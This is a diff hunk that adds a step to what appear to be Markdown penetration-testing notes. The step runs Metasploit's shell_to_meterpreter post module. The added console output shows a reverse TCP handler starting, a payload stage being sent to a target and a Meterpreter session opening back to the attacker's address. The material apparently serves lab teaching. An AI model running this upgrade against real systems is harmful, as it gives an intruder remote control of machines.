@@ -1057,6 +1057,31 @@ Note that `LHOST` is technically marked optional by the module, but leaving it t
 <br>
 </div>
 
+**Command**
+
+```
+run
+```
+
+`exploit` is aliased.
+
+**Result**
+
+```shell
+msf post(multi/manage/shell_to_meterpreter) > run
+[*] Upgrading session ID: 1
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 192.168.134.39:4433 
+[*] Post module execution completed
+msf post(multi/manage/shell_to_meterpreter) > 
+[*] Sending stage (248902 bytes) to 10.48.162.9
+[*] Meterpreter session 2 opened (192.168.134.39:4433 -> 10.48.162.9:49343) at 2026-09-02 08:29:58 -0400
+[*] Stopping exploit/multi/handler
+
+msf post(multi/manage/shell_to_meterpreter) > 
+```
+
+
 <div align="center">
 <br>
 ※※※※※※※※※※※※※※※※※※※※※※※※
